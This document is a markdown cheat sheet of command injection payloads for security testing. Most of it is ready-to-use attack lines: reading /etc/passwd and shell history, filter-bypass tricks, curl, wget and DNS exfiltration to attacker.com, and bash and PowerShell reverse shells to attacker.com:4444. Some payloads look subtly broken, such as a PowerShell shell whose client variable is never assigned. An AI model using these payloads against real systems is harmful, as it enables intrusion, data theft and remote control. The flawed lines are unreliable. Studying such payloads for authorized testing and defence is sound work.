# Command Injection Payload Cheat Sheet

This cheat sheet contains a collection of command injection payloads used to test for and exploit command injection vulnerabilities. **Note:** These payloads are strictly for educational and authorized testing purposes only.

---

## Contents

- [Basic Command Injection Payloads](#basic-command-injection-payloads)
- [Chained Commands](#chained-commands)
- [Bypassing Filters](#bypassing-filters)
- [Environment Variable Injection](#environment-variable-injection)
- [Exfiltrating Data](#exfiltrating-data)
- [Blind Command Injection](#blind-command-injection)
- [Advanced Command Injection Techniques](#advanced-command-injection-techniques)

---

## Basic Command Injection Payloads

Basic payloads execute arbitrary commands when input is unsafely passed to a shell interpreter.

```bash
; cat /etc/passwd          # Linux
; dir                       # Windows
| cat /etc/passwd
& dir
```

---

## Chained Commands

Chaining commands allows the attacker to execute multiple commands within a single request.

```bash
# Using Semicolon
; whoami; uname -a; id

# Using AND
&& whoami && uname -a && id

# Using OR (Only executes next command if the previous one fails)
|| whoami || id

# Using Pipe (|)
| whoami
| ls -la
```

---

## Bypassing Filters

Command injection filters often look for specific characters or keywords. Bypass techniques can sometimes evade simple input sanitization.

### Whitespace Bypass

Inserting different whitespace characters (like `${IFS}`) can bypass strict space-based filters.

```bash
# Using Internal Field Separator (IFS)
cat${IFS}/etc/passwd
```

### Hexadecimal/Octal Encoding

Using encoded characters can bypass filters looking for specific keywords or characters.

```bash
# Using Hex Encoding for / and space
cat%20/etc/passwd
```

### Command Substitution

Using backticks (`` ` ``) or `$()` for command substitution.

```bash
`whoami`
$(whoami)
```

---

## Environment Variable Injection

Environment variables can be used in payloads to leverage system-specific values.

```bash
# Injecting PATH Variable
echo $PATH
echo ${PATH}

# Using Random Environment Variables
echo $HOME
cat $HOME/.bash_history
```

---

## Exfiltrating Data

Command injection vulnerabilities can be used to retrieve system data and exfiltrate it to an external server.

### File Exfiltration with `curl` or `wget`

```bash
# Linux
curl http://attacker.com/$(cat /etc/passwd)
wget http://attacker.com --post-file=/etc/passwd
```

### DNS Exfiltration

This payload uses a DNS request to send data to a listening DNS server on an attacker-controlled domain.

```bash
# Extracting data using DNS query
nslookup $(whoami).attacker.com
```

---

## Blind Command Injection

Blind command injection is used when command output isn’t visible. These techniques often rely on observable side effects, like response delays.

### Delays with `sleep` or `ping`

```bash
# Linux (Sleep)
; sleep 10

# Windows (Ping to create delay)
& ping -n 10 127.0.0.1
```

### Network Interactions

Sending requests that reach an external server can help confirm command injection vulnerabilities without visible output.

```bash
curl http://attacker.com/$(whoami)
ping attacker.com
```

---

## Advanced Command Injection Techniques

### File Write Injection

Injecting data into files can sometimes achieve persistent access or set up additional backdoors.

```bash
# Writing a string to a file
echo "Injected content" > /tmp/injected.txt
```

### Reverse Shell Payloads

Reverse shells allow remote command execution by connecting back to an attacker’s machine.

```bash
# Bash Reverse Shell (Linux)
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# PowerShell Reverse Shell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> **Note**: Reverse shell payloads should only be used in controlled, authorized environments as they can lead to full system compromise.

---

## Additional Notes

- **Character Encoding**: Some systems may allow encoding characters (e.g., base64, hex) to bypass input restrictions.
- **Command Length Limits**: Check if the application has character limits that might truncate payloads.
- **Environment-Specific Commands**: Some payloads are OS-specific, so ensure compatibility with the target system.

---

### License

This cheat sheet is open-sourced and can be used for ethical testing and research. Unauthorized or illegal testing is prohibited.

---
